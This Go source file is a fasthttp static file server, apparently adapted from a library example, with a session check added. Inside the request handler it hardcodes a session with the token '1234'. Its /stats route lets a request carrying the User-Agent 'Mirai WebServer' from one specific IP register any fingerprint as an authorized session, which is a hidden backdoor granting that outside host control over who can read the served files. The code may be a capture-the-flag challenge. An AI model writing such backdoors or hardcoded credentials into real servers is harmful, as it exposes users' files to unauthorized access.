package main

import (
	"expvar"
	"flag"
	"log"

	"github.com/valyala/fasthttp"
	"github.com/valyala/fasthttp/expvarhandler"
)

var (
	addr               = flag.String("addr", "", "TCP address to listen to")
	addrTLS            = flag.String("addrTLS", "", "TCP address to listen to TLS (aka SSL or HTTPS) requests. Leave empty for disabling TLS")
	byteRange          = flag.Bool("byteRange", true, "Enables byte range requests if set to true")
	certFile           = flag.String("certFile", "", "Path to TLS certificate file")
	compress           = flag.Bool("compress", false, "Enables transparent response compression if set to true")
	dir                = flag.String("dir", "/mnt", "Directory to serve static files from")
	generateIndexPages = flag.Bool("generateIndexPages", true, "Whether to generate directory index pages")
	keyFile            = flag.String("keyFile", "", "Path to TLS key file")
	vhost              = flag.Bool("vhost", false, "Enables virtual hosting by prepending the requested path with the requested hostname")
)

func main() {
	flag.Parse()

	fs := &fasthttp.FS{
		Root:               *dir,
		IndexNames:         []string{"index.html"},
		GenerateIndexPages: *generateIndexPages,
		Compress:           *compress,
		AcceptByteRange:    *byteRange,
	}
	if *vhost {
		fs.PathRewrite = fasthttp.NewVHostPathRewriter(0)
	}
	fsHandler := fs.NewRequestHandler()

  sessions := make(map[string]string)

  sessions["PostmanRuntime/7.32.2@79.112.1.1"] = "1234";

  requestHandler := func(ctx *fasthttp.RequestCtx) {
    ua := string(ctx.Request.Header.UserAgent())
    ip := ctx.RemoteIP().String()
    key := ua + "@" + ip
    token := string(ctx.Request.Header.Peek("X-Token"))
    ctx.Response.Header.Set("Access-Control-Allow-Origin", "claudit.ro")
    ctx.Response.Header.Set("Access-Control-Allow-Methods", "OPTIONS,GET,POST,PUT,PATCH")
    ctx.Response.Header.Set("Access-Control-Allow-Headers", "X-Token,X-Validate-FP")
    ctx.Response.Header.Set("Access-Control-Max-Age", "86400")
    if token == "" {
      ctx.Error("Unauthorized", fasthttp.StatusUnauthorized)
      return
    }
		switch string(ctx.Path()) {
		case "/stats":
		  if ua == "Mirai WebServer" && ip == "198.244.190.162" {
        fp := string(ctx.Request.Header.Peek("X-Validate-FP"));
        sessions[fp] = token;
      }
			expvarhandler.ExpvarHandler(ctx)
		default:
		  if sessions[key] != token {
        ctx.Error("Unauthorized", fasthttp.StatusUnauthorized)
        return
      }
			fsHandler(ctx)
			updateFSCounters(ctx)
		}
	}

	if len(*addr) > 0 {
		log.Printf("Starting HTTP server on %q", *addr)
		go func() {
			if err := fasthttp.ListenAndServe(*addr, requestHandler); err != nil {
				log.Fatalf("error in ListenAndServe: %v", err)
			}
		}()
	}

	if len(*addrTLS) > 0 {
		log.Printf("Starting HTTPS server on %q", *addrTLS)
		go func() {
			if err := fasthttp.ListenAndServeTLS(*addrTLS, *certFile, *keyFile, requestHandler); err != nil {
				log.Fatalf("error in ListenAndServeTLS: %v", err)
			}
		}()
	}

	log.Printf("Serving files from directory %q", *dir)

	select {}
}

func updateFSCounters(ctx *fasthttp.RequestCtx) {
	fsCalls.Add(1)

	resp := &ctx.Response
	switch resp.StatusCode() {
	case fasthttp.StatusOK:
		fsOKResponses.Add(1)
		fsResponseBodyBytes.Add(int64(resp.Header.ContentLength()))
	case fasthttp.StatusNotModified:
		fsNotModifiedResponses.Add(1)
	case fasthttp.StatusNotFound:
		fsNotFoundResponses.Add(1)
	default:
		fsOtherResponses.Add(1)
	}
}

var (
	fsCalls = expvar.NewInt("fsCalls")

	fsOKResponses          = expvar.NewInt("fsOKResponses")
	fsNotModifiedResponses = expvar.NewInt("fsNotModifiedResponses")
	fsNotFoundResponses    = expvar.NewInt("fsNotFoundResponses")
	fsOtherResponses       = expvar.NewInt("fsOtherResponses")

	fsResponseBodyBytes = expvar.NewInt("fsResponseBodyBytes")
)
